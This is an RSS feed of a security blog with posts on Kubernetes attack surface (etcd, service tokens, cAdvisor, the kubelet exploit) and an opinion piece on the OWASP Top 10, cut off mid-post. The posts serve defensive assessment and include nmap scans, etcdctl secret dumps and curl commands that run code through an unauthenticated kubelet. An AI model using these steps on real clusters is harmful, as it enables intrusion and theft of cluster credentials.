<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title></title>
		<description>Things that occur to me</description>
		<link>/</link>
		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Kubernetes Attack Surface - etcd</title>
				<description>&lt;p&gt;&lt;a href=&quot;https://coreos.com/etcd&quot;&gt;etcd&lt;/a&gt; is a key element of most Kubernetes deployments as it stores the cluster state including items like service tokens, secrets and service configurations.&lt;/p&gt;

&lt;p&gt;So keeping access to this limited is pretty important for a secure cluster.  Depending on how what distribution of Kubernetes, there’s a number of different default configurations you might see.&lt;/p&gt;

&lt;p&gt;Some, like kubeadm, will bind etcd to the localhost interface only.  In this kind of setup an attacker would need to get access to the master node in order to get access to the API interface, so the exposure is somewhat limited.&lt;/p&gt;

&lt;p&gt;However the problem with localhost binding only is that it doesn’t really allow for clustered etcd setups.  If you want to have multiple etcd databases to allow some redundancy you need to allow for communications between datastores.&lt;/p&gt;

&lt;p&gt;In these cases port 2379/TCP and 2380/TCP are likely to be exposed on the network.  2379 is for client –&amp;gt; etcd communications, and 2380 is for communications between the different nodes in the etcd cluster.&lt;/p&gt;

&lt;p&gt;Its at this point that you’ll want to be well acquainted with the CoreOS guidelines on &lt;a href=&quot;https://coreos.com/etcd/docs/latest/op-guide/security.html&quot;&gt;etcd security&lt;/a&gt;.  This lays out the options that are available.  Basically etcd uses client certificate authentication, but there’s a couple of important points to note&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;There’s no checking of information in the certificate CN or SAN fields, so any valid certificate will allow access. So its probably worth using a dedicated certificate authority for the etcd cluster, and not using certificate issued by another CA (such as the one you’re using for general Kubernetes setup).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;With etcd and Kubernetes the setup is all or nothing, there’s no authorisation used, so be very careful with which clients are allowed access to the etcd datastore.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So say you’re reviewing a cluster and want to assess the etcd security posture, what’s the approach?&lt;/p&gt;

&lt;p&gt;You’ll likely need a copy of etcdctl to query the service.  Older versions can be queried with curl, but in newer Kubernetes installs, they’ve moved to gRPC and curl doesn’t work any more :(&lt;/p&gt;

&lt;p&gt;etcdctl can be acquired by downloading an etcd release like &lt;a href=&quot;https://github.com/coreos/etcd/releases/download/v3.1.5/etcd-v3.1.5-linux-amd64.tar.gz&quot;&gt;this one&lt;/a&gt; and getting it from the tarball.  Alternatively if you can deploy containers to the cluster, you could deploy something like &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools/&quot;&gt;this image&lt;/a&gt; which has it already installed.&lt;/p&gt;

&lt;p&gt;once you’ve got etcdctl installed, you can query the API with something like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;etcdctl --endpoint=http://[etcd_server_ip]:2379 ls&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If you get back &lt;code class=&quot;highlighter-rouge&quot;&gt;/registry&lt;/code&gt; you’re likely dealing with a v2 install (Kubernetes 1.5 or lower) and you can easily wander through and explore the config.  In particular the &lt;code class=&quot;highlighter-rouge&quot;&gt;/registry/secrets/default&lt;/code&gt; path is likely to be of interest as it may contain the default service token which can provide elevated rights to the cluster.&lt;/p&gt;

&lt;p&gt;If you get back a blank line from the initial query its reasonably likely that you’ve got a v3 cluster and getting the data out is a bit different.&lt;/p&gt;

&lt;p&gt;First up you need to let etcdctl know that you’re dealing with v3, so &lt;code class=&quot;highlighter-rouge&quot;&gt;export ETCDCTL_API=3&lt;/code&gt; is needed.&lt;/p&gt;

&lt;p&gt;Once you’ve got that environment variable set, you should see a different set of etcdctl commands as being available, including &lt;code class=&quot;highlighter-rouge&quot;&gt;etcdctl snapshot save&lt;/code&gt; .  You can use this command to dump an instance of the etcd database to a file on disk.&lt;/p&gt;

&lt;p&gt;This database is in the boltdb format, so it’s possible to read the file using something like &lt;a href=&quot;https://github.com/br0xen/boltbrowser&quot;&gt;boltbrowser&lt;/a&gt;.  Unfortunately the format of the data will be a bit broken as it’s serialized in proto format (more details in &lt;a href=&quot;https://github.com/coreos/etcd/issues/7723&quot;&gt;this github issue&lt;/a&gt;), but you can likely still extract some useful information, if that’s your goal.&lt;/p&gt;

</description>
				<pubDate>Mon, 01 May 2017 15:15:39 +0100</pubDate>
				<link>/blog/2017/05/01/Kubernetes-Security-etcd/</link>
				<guid isPermaLink="true">/blog/2017/05/01/Kubernetes-Security-etcd/</guid>
			</item>
		
			<item>
				<title>Container Testing - A small tools container with SSH</title>
				<description>&lt;p&gt;When you’re doing security testing of container environments one of the things that can be pretty useful is having a container with useful tools connected to the container network.  From there you can run network scans of the container network and also test the scenario of “malicious container”&lt;/p&gt;

&lt;p&gt;There’s a couple of ways of achieving this goal. You could run a container interactively with something like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run -i -t [image_name] /bin/sh&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;but one of the downsides of using a container like this is if you exit from the container, it’ll stop running, so ideally you want a container that’ll keep running and that you can connect to over the network.&lt;/p&gt;

&lt;p&gt;One example of this approach is &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools/&quot;&gt;this image&lt;/a&gt; which has a couple of useful features.&lt;/p&gt;

&lt;p&gt;Its based on alpine linux so the image is nice and small, and it runs an SSH daemon so that it’ll stay running and you can just connect in with SSH (assuming that you have a root from the location you start from to the container)&lt;/p&gt;

&lt;p&gt;It also has a neat trick that I got from some &lt;a href=&quot;https://github.com/fedora-cloud/Fedora-Dockerfiles/blob/master/ssh/entrypoint.sh&quot;&gt;Fedora dockerfiles&lt;/a&gt; which is that it creates a random password each time you start an instance of the image.  This is a good thing (tm) as you don’t want a static password baked in to your image.&lt;/p&gt;

&lt;p&gt;To use this approach just do something like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker run -d raesene/alpine-containertools&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;then find out what IP address has been assigned to your container with&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker inspect -f &quot;&quot; [container_name]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and what the password that’s been generated with&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;docker logs [container_name]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and you should be able to SSH in and get started with testing.  This image has some network tools like nmap and curl and also some container tools like the docker client, kubectl and etcdctl which is handy for checking whether you can get access to the ETCD database in a Kubernetes network.&lt;/p&gt;
</description>
				<pubDate>Sat, 15 Apr 2017 13:35:39 +0100</pubDate>
				<link>/blog/2017/04/15/Container-Testing-small-tools-container/</link>
				<guid isPermaLink="true">/blog/2017/04/15/Container-Testing-small-tools-container/</guid>
			</item>
		
			<item>
				<title>Some thoughts on the new OWASP Top 10 - A7</title>
				<description>&lt;p&gt;The first release candidate of the new &lt;a href=&quot;https://github.com/OWASP/Top10/blob/master/2017/OWASP%20Top%2010%20-%202017%20RC1-English.pdf&quot;&gt;OWASP Top 10&lt;/a&gt; got released last week and one of the changes in particular seems to be generating a lot of comment, so I thought I’d chip in too with some thoughts.&lt;/p&gt;

&lt;p&gt;The title of this one is “Insufficient Attack Protection” and at core I think its about applications actively protecting themselves from attack, which I think is a great idea.&lt;/p&gt;

&lt;p&gt;What I don’t think it’s about, and it might benefit from some clarifications in this regard, is a requirement for all applications to use a WAF or RASP.&lt;/p&gt;

&lt;p&gt;So why do I like this idea?  Well if you think about almost every application kind of has some attack protection already, with account lockout policies.  The application sees something which isn’t right, a login with the wrong password, and after a pre-determined number of incorrect attempts, it takes an action, perhaps locking the account, perhaps asking for additional details, perhaps alerting an administrator (maybe even all three!).&lt;/p&gt;

&lt;p&gt;So the concept in general is already in use, but I think a lot of applications would benefit from extending it.  For example if a user says that their first name is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; that’s almost definitely not true! It’s a pretty clear indication that someone is trying to attack your application and you can make that attackers life harder by restricting their access or taking some other action, depending on the context.&lt;/p&gt;

&lt;p&gt;Another one could be if there’s a dropdown in your application with 5 possible values and the form is submitted with something that’s not in that list.  An ordinary user pretty much won’t ever do this, so it’s an indication that someone is either editing the HTML before submission, or using a proxy to intercept and modify the request, both reasonable indications (in most cases) that something untoward is happening.&lt;/p&gt;

&lt;p&gt;These are pretty simplistic examples but luckily there’s a really cool OWASP project that goes into a ton more detail, &lt;a href=&quot;https://www.owasp.org/index.php/OWASP_AppSensor_Project&quot;&gt;OWASP Appsensor&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This kind of action can make automated attacks much harder to execute and also can provide excellent alerting for blue teams to work with, and I think that’s a big win.  One key aspect of this is that the detection and response is embedded into the application.  One problem with external add-ons is that they can lack context about what is and is not expected behaviour in an application, that kind of context only really exists within the application itself.&lt;/p&gt;

&lt;p&gt;Predictably and quite justifiably there have been a lot of concerns and questions raised about this suggested change.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;This will make Pentesters and Bug Bounty People’s lives harder&lt;/strong&gt; .  Yep that one’s true, but then as pentesters and bug bounty researchers are pseudo bad guys, isn’t that really a good thing? Flippancy aside, I think that applications with a lot of active defence need to have test environments where this is disabled specifically to allow for automated testing. Some testing would occur there, and then when the final product is ready to be tested, you can enable the protections and check that they’re working ok.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;This is a mandate for WAF vendors&lt;/strong&gt; I really hope not.  Sure some applications won’t be able to retro-fit controls, and might want to use a WAF.  But two things on that, one there are open source WAFs available and two, when the security industry started pushing 2FA harder, I don’t recall anyone saying that “hey this is just a vendor pitch for RSA tokens” and if they had, I wouldn’t have agreed with them either :)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;There’s no statistical evidence that this is a problem&lt;/strong&gt; . I’m a bit torn on this one.  On the one hand that’s likely true and data based approaches are good.  On the other hand, how would you measure this?  No automated scanning tool is going to put “hey we didn’t get kicked out whilst testing” in their report is it?  I can only offer anecdotal evidence, that I only very very rarely see any kind of application active protection in play, so it’s definitely not commonly deployed.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;This isn’t a vulnerability&lt;/strong&gt; .  Yep that’s true, but AFAICS this is a list of risks, not a list of vulnerabilities.  It may get used as a list of vulnerabilities, but on the title page it says risks :)&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Anyway, there’s still lots of discussions to be had on this one and the rest of the changes, before this years Top10 is finalized, so it’ll be interesting to see how it all shakes out.&lt;/p&gt;
</description>
				<pubDate>Fri, 14 Apr 2017 17:05:39 +0100</pubDate>
				<link>/blog/2017/04/14/OWASP-Top-10-A7-Thoughts/</link>
				<guid isPermaLink="true">/blog/2017/04/14/OWASP-Top-10-A7-Thoughts/</guid>
			</item>
		
			<item>
				<title>Kubernetes Attack Surface - Service Tokens</title>
				<description>&lt;p&gt;Whilst spending some more time looking at Kubernetes, to help out with the forthcoming CIS Security standard, I was looking at cluster component authentication and noticed something that might not be known by everyone using Kubernetes, so I thought it’d be worth a post.&lt;/p&gt;

&lt;p&gt;When pods are deployed to a cluster, in most default installs, the &lt;a href=&quot;https://kubernetes.io/docs/admin/admission-controllers/&quot;&gt;Admission Contoller&lt;/a&gt; will run and take a set of pre-defined actions before the pods go live.  One of those actions is to mount a &lt;a href=&quot;https://kubernetes.io/docs/admin/service-accounts-admin/&quot;&gt;Service Account&lt;/a&gt; inside the containers that make up the pod.&lt;/p&gt;

&lt;p&gt;This service account includes a token which is mounted at a predictable location &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/run/secrets/kubernetes.io/serviceaccount/token&lt;/code&gt; .&lt;/p&gt;

&lt;p&gt;What’s interesting is that, by default unless &lt;a href=&quot;https://kubernetes.io/docs/admin/authorization/rbac/&quot;&gt;RBAC&lt;/a&gt; is deployed, it’s likely that this token provides cluster admin privileges.&lt;/p&gt;

&lt;p&gt;This means that any attacker with access to a container can, fairly easily, get full access to the cluster API (in fact it’s kind of easier than the &lt;a href=&quot;https://raesene.github.io/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/&quot;&gt;kubelet exploit&lt;/a&gt; ).&lt;/p&gt;

&lt;p&gt;If you want to check this to see if it affects your cluster, just run a pod inside the cluster, attach to one of the containers, get a copy of &lt;a href=&quot;https://storage.googleapis.com/kubernetes-release/release/v1.6.0/bin/linux/amd64/kubectl&quot;&gt;kubectl&lt;/a&gt; and point it at your API Server with something like&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./kubectl config set-cluster test --server=https://[API_SERVER_IP]:[API_SERVER_PORT]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;then try out some kubernetes commands…&lt;/p&gt;

&lt;p&gt;Fortunately this issue has been addressed with Kubernetes 1.6 setups which make use of the default RBAC policy, so if you’re concerned about container breakout scenarios, I’d thoroughly recommend upgrading and making sure that you’re using a restrictive RBAC policy.&lt;/p&gt;

</description>
				<pubDate>Sun, 02 Apr 2017 18:05:39 +0100</pubDate>
				<link>/blog/2017/04/02/Kubernetes-Service-Tokens/</link>
				<guid isPermaLink="true">/blog/2017/04/02/Kubernetes-Service-Tokens/</guid>
			</item>
		
			<item>
				<title>Kubernetes Attack Surface - cAdvisor</title>
				<description>&lt;p&gt;So following on from my post about the &lt;a href=&quot;https://raesene.github.io/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/&quot;&gt;kube-exploit&lt;/a&gt;, I thought it would be interesting to look more at the attack surface of my sample Kubernetes cluster from the perspective of a Rogue container.  The setup follows the same path as the last post and I’m running from a kali linux container running on my cluster, to simulate an attacker who has compromised a single container on a cluster.&lt;/p&gt;

&lt;p&gt;So first obvious thing to look at is the network attack surface. Open ports are a first option for an attacker who gets unauthorised access to a system.&lt;/p&gt;

&lt;p&gt;This cluster has three nodes on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.233&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.201&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.232&lt;/code&gt; so we can start with&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sT -n -p- 192.168.41.201,232,233&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;From that, we can see that there are some interesting ports to look at.  The first one I noticed is 4194/TCP.  On the cluster this is used by cAdvisor which provides metrics about your containers and is, by default, available without authentication.&lt;/p&gt;

&lt;p&gt;This provides quite a bit of information about the configuration of the cluster like a process list&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/media/cadvisor_processes.png&quot; alt=&quot;cadvisor process&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and some details on the configuration of the docker daemon on the host&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/media/cadvisor_docker.png&quot; alt=&quot;cadvisor docker&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s also a set of handy API endpoints if you want to dump the information in JSON format.  For example, to get the spec for all the containers running on a host you can just go to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.41.233:4194/api/v2.0/spec?recursive=true&lt;/code&gt; and get output like&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &quot;/docker/0598e0682955545ef27486ce3c04d62b6e1dc15496fb8072c297f2b548e7e10f&quot;: {
        &quot;creation_time&quot;: &quot;2016-10-09T03:55:54.113949226+01:00&quot;,
        &quot;aliases&quot;: [
            &quot;k8s_weave-npc.27539310_weave-net-xf53p_kube-system_af83b2df-8683-11e6-849b-000c29d33879_f938e1de&quot;,
            &quot;0598e0682955545ef27486ce3c04d62b6e1dc15496fb8072c297f2b548e7e10f&quot;
        ],
        &quot;namespace&quot;: &quot;docker&quot;,
        &quot;labels&quot;: {
            &quot;io.kubernetes.container.hash&quot;: &quot;27539310&quot;,
            &quot;io.kubernetes.container.name&quot;: &quot;weave-npc&quot;,
            &quot;io.kubernetes.container.restartCount&quot;: &quot;0&quot;,
            &quot;io.kubernetes.container.terminationMessagePath&quot;: &quot;/dev/termination-log&quot;,
            &quot;io.kubernetes.pod.name&quot;: &quot;weave-net-xf53p&quot;,
            &quot;io.kubernetes.pod.namespace&quot;: &quot;kube-system&quot;,
            &quot;io.kubernetes.pod.terminationGracePeriod&quot;: &quot;30&quot;,
            &quot;io.kubernetes.pod.uid&quot;: &quot;af83b2df-8683-11e6-849b-000c29d33879&quot;
        },
        &quot;has_cpu&quot;: true,
        &quot;cpu&quot;: {
            &quot;limit&quot;: 10,
            &quot;max_limit&quot;: 0,
            &quot;mask&quot;: &quot;0-1&quot;
        },
        &quot;has_memory&quot;: true,
        &quot;memory&quot;: {
            &quot;limit&quot;: 9223372036854771712,
            &quot;reservation&quot;: 9223372036854771712
        },
        &quot;has_custom_metrics&quot;: false,
        &quot;has_network&quot;: false,
        &quot;has_filesystem&quot;: true,
        &quot;has_diskio&quot;: true,
        &quot;image&quot;: &quot;weaveworks/weave-npc:1.7.0&quot;
    },
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This isn’t as serious an issue as the kubelet exploit of course, but still something you’d want to change in your deployment of Kubernetes to harden it.&lt;/p&gt;

&lt;p&gt;After noting this I had a look through the Kubernetes issue list and it looks like this is a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/11710&quot;&gt;known issue&lt;/a&gt; but unfortunately not one with a clear fix for now, so it’d need something like an iptables rule applied to restrict access to it.&lt;/p&gt;

</description>
				<pubDate>Fri, 14 Oct 2016 19:05:39 +0100</pubDate>
				<link>/blog/2016/10/14/Kubernetes-Attack-Surface-cAdvisor/</link>
				<guid isPermaLink="true">/blog/2016/10/14/Kubernetes-Attack-Surface-cAdvisor/</guid>
			</item>
		
			<item>
				<title>Kubernetes - From Container to Cluster</title>
				<description>&lt;p&gt;I’ve been reading up on Kubernetes a bit recently and &lt;a href=&quot;https://twitter.com/killahertz_&quot;&gt;Jesse Hertz&lt;/a&gt; pointed me at an interesting item around Kubernetes security that illustrates common problem of insecure defaults, so I thought it might be worth a post walking through the issue, mainly as a way for me to improve my Kubernetes knowledge but also could be useful for others who are deploying it.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;td;dr&lt;/strong&gt; if you can get access to the kubelet API port you can control the whole cluster and default configurations of Kubernetes are likely to make this possible, so be careful when setting up your clusters.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;So the issue I wanted to look at is this &lt;a href=&quot;https://github.com/kayrus/kubelet-exploit&quot;&gt;kubelet exploit&lt;/a&gt;.  Basically the kubelet is the service which runs on Kubernetes nodes and manages things like the docker installation on that node amongst other things.  It receives commands from the API server which co-ordinates the actions of the nodes in the cluster.&lt;/p&gt;

&lt;p&gt;The security problem lies in the fact that by default the kubelet service listens on a TCP/IP port with no authentication or authorization control, so anyone who can reach that port at a network level can execute kubelet commands just by issuing HTTP requests to the service.&lt;/p&gt;

&lt;p&gt;This means that an attacker who can get access to that port can basically take over the whole cluster pretty easily.&lt;/p&gt;

&lt;p&gt;The kubernetes team are well aware of this issue but a fix isn’t planned until &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/11816&quot;&gt;Kubernetes 1.5&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;There’s also a workaround mentioned on the kubelet-exploit page which involves binding the kubelet to 127.0.0.1 and then connecting it to the kube-apiserver via SSH tunnels.&lt;/p&gt;

&lt;p&gt;To explore this problem I followed the &lt;a href=&quot;http://kubernetes.io/docs/getting-started-guides/kubeadm/&quot;&gt;kubeadm guide&lt;/a&gt; from the kubernetes site.  Kubeadm is a tool which allows for clusters to be easily set up and appears to somewhat be modeled after some of the docker swarm commands.&lt;/p&gt;

&lt;p&gt;I followed the tutorial through to the point where I had a working cluster, taking all the defaults.&lt;/p&gt;

&lt;p&gt;Then I deployed a container with some tools into the cluster, the scenario we’re testing is that an attacker has gained access to a container in the cluster, and we’ll see what they can do to take control of the cluster with only that access&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl run -i -t badcontainer --image=kalilinux/kali-linux-docker
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;which after a while for the image to download gives us a bash shell running in a container on the cluster.&lt;/p&gt;

&lt;p&gt;So now we can scan round to see whether the port we’re looking for is available.&lt;/p&gt;

&lt;p&gt;First add some tools to our build&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt update
apt install nmap curl
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Then scan the network. In this case my main network where the nodes are installed is 192.168.41.0/24&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -v -n -p10250 192.168.41.0/24
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;from that we get back a bunch of filtered ports but also three open ones which are the IP addresses of my kubernetes nodes.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 192.168.41.201
Host is up (0.00013s latency).
PORT      STATE SERVICE
10250/tcp open  unknown

Nmap scan report for 192.168.41.232
Host is up (0.000065s latency).
PORT      STATE SERVICE
10250/tcp open  unknown

Nmap scan report for 192.168.41.233
Host is up (0.00020s latency).
PORT      STATE SERVICE
10250/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now we can use some of the kubectl commands mentioned in the exploit to start getting more access to the cluster.  First up lets enumerate our containers&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -sk https://192.168.41.233:10250/runningpods/ | python -mjson.tool
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This returns a list of the pods running on the node in JSON form, and also the images they’re based on.  The most interesting one here is&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;metadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;creationTimestamp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-apiserver-kube&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;namespace&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-system&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;uid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0446d05fb9406214210e8d29397f8bf2&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;spec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;containers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gcr.io/google_containers/kube-apiserver-amd64:v1.4.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-apiserver&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;resources&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gcr.io/google_containers/pause-amd64:3.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;resources&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;it’s running the kube-apiserver image, so that’ll be our API server.  As I mentioned earlier the API server is basically the heart of the cluster, so access to it provides a lot of control over the cluster itself.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=ls -la /&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;lists the files in the root directory of that container and if we run&lt;/p&gt;

